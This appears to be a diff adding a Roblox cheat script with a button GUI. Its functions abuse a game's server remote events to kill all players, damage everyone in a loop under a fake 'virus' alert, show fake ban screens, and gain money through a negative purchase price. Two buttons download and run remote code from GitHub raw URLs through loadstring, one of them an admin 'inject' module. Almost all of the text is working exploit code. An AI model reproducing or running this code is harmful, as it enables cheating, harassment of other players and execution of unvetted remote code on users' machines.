+				for i,v in pairs(game.Players:GetChildren())do
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+	
+					firesignal(game.Workspace.resources.RemoteEvent.OnClientEvent,"displayChoice",'returnToMenu',Value)
+					lib.FireOtherClients("displayChoice",'returnToMenu',Value)
+				end
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "All Money (Bake a Cake First)",
+			Callback = function()
+				game.Workspace.resources.RemoteFunction:InvokeServer("attemptPurchaseFurniture", "23", -10000)
+			end
+		})
+	
+	
+		Tab:AddButton({
+			Name = "Greenify Map",
+			Callback = function()
+				for i,v in pairs(workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						game:GetService("Workspace").resources.RemoteEvent:FireServer("toggleCamControl",{["camera"] = {["status"] = v}},true)
+					end
+				end
+			end
+		})
+	
+		Tab:AddButton({
+			Name = "Kill All",
+			Callback = function()
+				for i,v in pairs(game.Players:GetPlayers()) do
+					workspace.resources.RemoteEvent:FireServer("FireAllClients","drawLaser",Vector3.new(), Vector3.new(),{["Name"] = "Head",["Parent"] = v.Character})
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Server Virus",
+			Callback = function()
+				local Title = "Attention"
+				local Yourmessage = "There Is A Global Virus,Stay Safe!"
+	
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "showNotice", Title, Yourmessage)
+				wait (5)
+				local Yourmessage = "Pandemic Has Started!"
+	
+				game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "smallNotice", Yourmessage)
+				while wait (3) do
+					for i,v in pairs(game.Players:GetChildren()) do
+						game.Workspace.resources.RemoteEvent:FireServer("dealDamage", v.Character.Humanoid,10)
+					end
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Greyify Map",
+			Callback = function()
+				for i,v in pairs(workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						game:GetService("Workspace").resources.RemoteEvent:FireServer("toggleCamControl",{["camera"] = {["status"] = v}},false)
+					end
+				end
+			end
+		})
+	
+		Tab:AddTextbox({
+			Name = "Message 1",
+			Default = "Broadcast",
+			TextDisappear = true,
+			Callback = function(Value)
+				for i,v in pairs(game.Players:GetChildren())do
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+					local Yourmessage = "Value"
+	
+					game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "smallNotice", Value)
+				end
+			end
+		})
+		Tab:AddTextbox({
+			Name = "Ban All",
+			Default = "Broadcast",
+			TextDisappear = true,
+			Callback = function(Value)
+				for i,v in pairs(game.Players:GetChildren())do
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+					local Yourmessage = "Value"
+	
+					game:GetService("Workspace").resources.RemoteEvent:FireServer("FireAllClients", "showBanScreen", Value)
+				end
+			end
+		})
+		Tab:AddTextbox({
+			Name = "Ban Others",
+			Default = "Broadcast",
+			TextDisappear = true,
+			Callback = function(Value)
+				for i,v in pairs(game.Players:GetChildren())do
+					local lib = require(game:GetService("Workspace").upsilonLibrary)
+					local Yourmessage = "Value"
+	
+					game:GetService("Workspace").resources.RemoteEvent:FireServer("FireOtherClients", "showBanScreen", Value)
+				end
+			end
+		})
+		Tab:AddButton({
+			Name = "Speed",
+			Callback = function()  
+				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = "60"
+			end
+		})
+		Tab:AddButton({
+			Name = "Jump",
+			Callback = function()
+				game.Players.LocalPlayer.Character.Humanoid.JumpPower = "200"
+			end
+		})
+		OrionLib:Init()
+	
+	
+		while wait() do
+			if doorspamming == false then
+	
+			else
+				doorSpam()
+			end
+		end
+	
+		--noclip
+	
+		pcall(function()
+			game:GetService("RunService").Stepped:Connect(function()
+				if shared.noclip == true then
+					lp.Character.Head.CanCollide = false
+					lp.Character.Torso.CanCollide = false
+				end
+			end);
+		end) 
+	end)
+end
+coroutine.wrap(APTOUHN_fake_script)()
+local function TBRUZ_fake_script() -- TextButton_5.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_5)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/rusello25/scripts/main/Harked"),true))()
+	end)
+end
+coroutine.wrap(TBRUZ_fake_script)()
+local function PWBXWG_fake_script() -- SettingsButton.LocalScript 
+	local script = Instance.new('LocalScript', SettingsButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+		script.Parent.Parent.Parent.SettingsButton.Visible = true
+	end)
+end
+coroutine.wrap(PWBXWG_fake_script)()
+local function AVPN_fake_script() -- TextButton_8.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_8)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Page1.Visible = false
+		script.Parent.Parent.Page2.Visible = true
+	end)
+end
+coroutine.wrap(AVPN_fake_script)()
+local function FNPC_fake_script() -- TextButton_9.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_9)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Page1.Visible = true
+		script.Parent.Parent.Page2.Visible = false
+	end)
+end
+coroutine.wrap(FNPC_fake_script)()
+local function KBIJ_fake_script() -- KohlsAdmin.LocalScript 
+	local script = Instance.new('LocalScript', KohlsAdmin)
+
+	local kholsmodule = loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/Kohl's%20Module"))()
+	local execmdbutton = script.Parent["Execute Cmd"]
+	local exefunbutton = script.Parent["Execute Function"]
+	local injectbutton = script.Parent.Inject
+	
+	injectbutton.MouseButton1Click:connect(function()
+		kholsmodule:inject()
+	end)
+	
+	execmdbutton.MouseButton1Click:connect(function()
+		kholsmodule:runcmd(script.Parent.cmds.Text)
+	end)
+	
+	exefunbutton.MouseButton1Click:connect(function()
+		if script.Parent.functions.Text == "avatar normal" then
+			kholsmodule:avatar("normal")
+		elseif script.Parent.functions.Text == "avatar sky" then
+			kholsmodule:avatar("sky")
+		elseif script.Parent.functions.Text == "avatar grass" then
+			kholsmodule:avatar("grass")
+		elseif script.Parent.functions.Text == "avatar tix" then
+			kholsmodule:avatar("tix")
+		elseif script.Parent.functions.Text == "avatar antlers" then
+			kholsmodule:avatar("antlers")
+		elseif script.Parent.functions.Text == "cape normal" then
+			kholsmodule:cape("normal")
+		elseif script.Parent.functions.Text == "cape bypassinian" then
+			kholsmodule:cape("bypassinian")
+		elseif script.Parent.functions.Text == "cape vetrex" then
+			kholsmodule:cape("vetrex")
+		elseif script.Parent.functions.Text == "cape c00lkidd" then
+			kholsmodule:runcmd("cape me red 433517917")
+		elseif script.Parent.functions.Text == "particle c00lkidd" then
+			kholsmodule:runcmd("particle me 433517917")
+		elseif script.Parent.functions.Text == "particle grass" then
+			kholsmodule:runcmd("particle me 70665424")
+		elseif script.Parent.functions.Text == "particle tix" then
+			kholsmodule:runcmd("particle me 963894159")
+		elseif script.Parent.functions.Text == "unparticle" then
+			kholsmodule:runcmd("unparticle")
+		end
+	end)
+end
+coroutine.wrap(KBIJ_fake_script)()
+local function AMYFVJC_fake_script() -- SettingsButton_2.LocalScript 
+	local script = Instance.new('LocalScript', SettingsButton_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Visible = false
+		script.Parent.Parent.Settings.Visible = true
+	end)
+end
+coroutine.wrap(AMYFVJC_fake_script)()
+local function KYYSF_fake_script() -- CloseOpen.LocalScript 
+	local script = Instance.new('LocalScript', CloseOpen)
+
+	local Open = true
+	local Frame = script.Parent.Parent.Frame
+	local Button = script.Parent
+	
+	function Clicked()
+		if Open == false then
+			Open = true
+			Frame.Visible = true
+			Button.Text = "Close" -- Closes the Frame
+		elseif Open == true then
+			Open = false
+			Frame.Visible = false
+			Button.Text = "Open" -- Opens the Frame
+		end
+	end
+	
+	
+	Button.MouseButton1Click:connect(Clicked)
+end
+coroutine.wrap(KYYSF_fake_script)()
